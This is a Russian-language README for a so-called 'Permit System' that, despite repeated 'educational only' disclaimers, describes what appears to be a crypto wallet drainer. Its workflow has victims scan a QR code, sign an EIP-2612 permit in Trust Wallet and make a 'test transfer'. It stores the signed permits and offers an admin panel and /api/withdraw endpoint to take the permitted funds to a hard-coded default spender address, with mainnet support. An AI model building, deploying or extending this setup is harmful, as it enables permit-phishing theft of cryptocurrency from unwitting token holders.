# ⚠️ Permit System - ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ

## КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ

**ЭТОТ ПРОЕКТ СОЗДАН ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ И ТЕСТИРОВАНИЯ НА СОБСТВЕННЫХ КОШЕЛЬКАХ**

- ⚠️ Используйте ТОЛЬКО с собственными тестовыми кошельками
- ⚠️ Никогда не используйте это для обмана других людей
- ⚠️ Использование этого кода для мошенничества незаконно
- ⚠️ Всегда проверяйте адреса контрактов перед подписанием permit

## Описание

Этот проект демонстрирует работу механизма permit (EIP-2612) в ERC-20 токенах. Система позволяет:

1. Генерировать QR код для подписания permit
2. Открывать веб-интерфейс в Trust Wallet
3. Подписывать permit с указанием разрешенной суммы
4. Выполнять тестовый перевод
5. Списывать разрешенную сумму с кошелька

## Установка

```bash
npm install --legacy-peer-deps
```

**Примечание:** Используйте флаг `--legacy-peer-deps` для решения конфликта версий между ethers 5 и hardhat-toolbox.

## Настройка

1. Скопируйте `env.example` в `.env`
2. Заполните необходимые параметры:
   - `NETWORK` - текущая сеть (`sepolia` или `mainnet`)
   - `TOKEN_ADDRESS_SEPOLIA` - адрес токена в Sepolia
   - `TOKEN_ADDRESS_MAINNET` - адрес токена в Mainnet
   - `SPENDER_ADDRESS` - адрес получателя разрешения (по умолчанию: `0xE4576aC79aBbe431EdD7aA55111a843529285edB`)
   - `SEPOLIA_RPC_URL` - RPC URL для Sepolia
   - `MAINNET_RPC_URL` - RPC URL для Mainnet
   - `PRIVATE_KEY` - приватный ключ для списания средств (⚠️ НИКОГДА не коммитьте!)

Подробные инструкции см. в `SETUP.md`

## Развертывание смарт-контракта

### Установка зависимостей для контрактов

```bash
npm install
```

### Компиляция контракта

```bash
npx hardhat compile
```

### Развертывание

Для Sepolia (тестовая сеть):
```bash
npx hardhat run scripts/deploy.js --network sepolia
```

Для Mainnet:
```bash
npx hardhat run scripts/deploy.js --network mainnet
```

После развертывания сохраните адрес контракта в `.env` файле:
- `TOKEN_ADDRESS_SEPOLIA` для Sepolia
- `TOKEN_ADDRESS_MAINNET` для Mainnet

## Быстрая настройка

```bash
# 1. Установить зависимости
npm install

# 2. Настроить проект (создаст .env файл)
npm run setup

# 3. Проверить конфигурацию
npm run check

# 4. Развернуть контракт в Sepolia
npm run deploy:sepolia

# 5. Сохранить адрес контракта в .env (TOKEN_ADDRESS_SEPOLIA=0x...)
```

## Запуск

```bash
npm start
```

Сервер запустится на `http://localhost:3000`

## Использование

### 1. Генерация QR кода

Откройте в браузере: `http://localhost:3000/qr-generator.html`

Или используйте API:
```
GET /api/qrcode?amount=100&spender=0x...
```

### 2. Процесс подписания permit

1. Отсканируйте QR код в Trust Wallet
2. В открывшемся веб-интерфейсе подключите кошелек
3. Введите сумму для разрешения
4. Подпишите permit (будет показано предупреждение)
5. Выполните тестовый перевод на указанную сумму
6. После этого разрешенная сумма может быть списана

### 3. Переключение сетей

- Через интерфейс: используйте селектор сети в `/qr-generator.html` или `/index.html`
- Через API: 
  - `GET /api/network` - получить текущую сеть
  - `POST /api/network` - переключить сеть (body: `{"network": "sepolia"}` или `{"network": "mainnet"}`)
- Через переменную окружения: измените `NETWORK=sepolia` на `NETWORK=mainnet` в `.env`

### 4. Управление permit

Откройте `http://localhost:3000/admin.html` для просмотра всех permit и списания средств.

Или используйте API:
```
POST /api/withdraw
{
  "permitId": "...",
  "amount": "100" // опционально, если не указано - списывается вся разрешенная сумма
}
```

## Веб-интерфейсы

- `/qr-generator.html` - Генератор QR кодов
- `/index.html` - Интерфейс для подписания permit (открывается при сканировании QR)
- `/transfer.html` - Интерфейс для тестового перевода
- `/admin.html` - Панель управления permit и списания средств

## API Endpoints

- `GET /api/qrcode?amount=100&spender=0x...&network=sepolia` - Генерация QR кода
- `GET /api/network` - Получить текущую сеть
- `POST /api/network` - Переключить сеть (body: `{"network": "sepolia"}` или `{"network": "mainnet"}`)
- `POST /api/permit` - Сохранение подписанного permit
- `POST /api/transfer-complete` - Подтверждение тестового перевода
- `POST /api/withdraw` - Списывание средств с использованием permit
- `GET /api/permits` - Список всех permit

## Безопасность

- ⚠️ Всегда проверяйте адреса контрактов
- ⚠️ Проверяйте разрешенную сумму перед подписанием
- ⚠️ Используйте только с тестовыми сетями
- ⚠️ Никогда не делитесь приватными ключами

## Лицензия

MIT - Только для образовательных целей

